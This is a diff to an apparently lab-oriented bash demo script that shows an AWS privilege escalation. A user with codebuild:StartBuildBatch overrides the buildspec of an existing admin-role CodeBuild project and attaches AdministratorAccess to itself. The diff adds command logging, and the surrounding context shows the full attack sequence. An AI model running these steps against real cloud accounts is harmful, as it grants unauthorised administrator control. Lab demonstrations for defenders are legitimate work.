@@ -3,7 +3,9 @@
 # Demo script for codebuild:StartBuildBatch privilege escalation
 # This script demonstrates how a user with StartBuildBatch can exploit existing CodeBuild project with buildspec-override
 
-set -e
+
+# Disable AWS CLI paging
+export AWS_PAGER=""
 
 # Colors for output
 RED='\033[0;31m'
@@ -11,6 +13,24 @@ GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
 NC='\033[0m' # No Color
+
+# Dim color for command display
+DIM='\033[2m'
+CYAN='\033[0;36m'
+
+# Track attack commands for summary
+ATTACK_COMMANDS=()
+
+# Display a command before executing it
+show_cmd() {
+    echo -e "${DIM}\$ $*${NC}"
+}
+
+# Display AND record an attack command
+show_attack_cmd() {
+    echo -e "\n${CYAN}\$ $*${NC}"
+    ATTACK_COMMANDS+=("$*")
+}
 
 # Configuration
 STARTING_USER="pl-prod-codebuild-003-to-admin-starting-user"
@@ -70,6 +90,7 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
+show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -81,6 +102,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
+show_cmd "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -88,6 +110,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 # Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
+show_cmd "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -99,6 +122,7 @@ echo ""
 echo -e "${YELLOW}Step 5: Discovering existing CodeBuild projects${NC}"
 echo "Attempting to list CodeBuild projects..."
 
+show_cmd "aws codebuild list-projects --region $AWS_REGION --query 'projects' --output text"
 PROJECTS=$(aws codebuild list-projects --region $AWS_REGION --query 'projects' --output text 2>/dev/null || echo "")
 
 if [ -n "$PROJECTS" ]; then
@@ -115,6 +139,7 @@ echo ""
 echo -e "${YELLOW}Step 6: Getting target project details${NC}"
 echo "Target project: $TARGET_PROJECT"
 
+show_cmd "aws codebuild batch-get-projects --region $AWS_REGION --names \"$TARGET_PROJECT\" --query 'projects[0]' --output json"
 PROJECT_INFO=$(aws codebuild batch-get-projects \
     --region $AWS_REGION \
     --names "$TARGET_PROJECT" \
@@ -165,6 +190,7 @@ echo "Project: $TARGET_PROJECT"
 echo "The build will execute with the project's admin role permissions"
 echo ""
 
+show_attack_cmd "aws codebuild start-build-batch --region $AWS_REGION --project-name \"$TARGET_PROJECT\" --buildspec-override file://\"$BUILDSPEC_FILE\" --output json"
 BUILD_RESULT=$(aws codebuild start-build-batch \
     --region $AWS_REGION \
     --project-name "$TARGET_PROJECT" \
@@ -195,6 +221,7 @@ MAX_WAIT=240  # 4 minutes for batch builds
 
 while [ $WAIT_TIME -lt $MAX_WAIT ]; do
     # Get batch status
+    show_cmd "aws codebuild batch-get-build-batches --region $AWS_REGION --ids \"$BUILD_BATCH_ID\" --output json"
     BATCH_INFO=$(aws codebuild batch-get-build-batches \
         --region $AWS_REGION \
         --ids "$BUILD_BATCH_ID" \
@@ -243,6 +270,7 @@ echo -e "${GREEN}✓ Policy should be propagated${NC}\n"
 echo -e "${YELLOW}Step 11: Verifying administrator access${NC}"
 echo "Attempting to list IAM users..."
 
+show_cmd "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
@@ -273,6 +301,13 @@ echo -e "  $STARTING_USER → (codebuild:StartBuildBatch)"
 echo -e "  → Existing project: $TARGET_PROJECT"
 echo -e "  → Buildspec-override executes with $TARGET_ROLE"
 echo -e "  → Attach AdministratorAccess to $STARTING_USER → Admin"
+
+if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
+    echo -e "\n${YELLOW}Attack Commands:${NC}"
+    for cmd in "${ATTACK_COMMANDS[@]}"; do
+        echo -e "  ${CYAN}\$ ${cmd}${NC}"
+    done
+fi
 
 echo -e "\n${YELLOW}Attack Artifacts:${NC}"
 echo "- Build Batch ID: $BUILD_BATCH_ID"
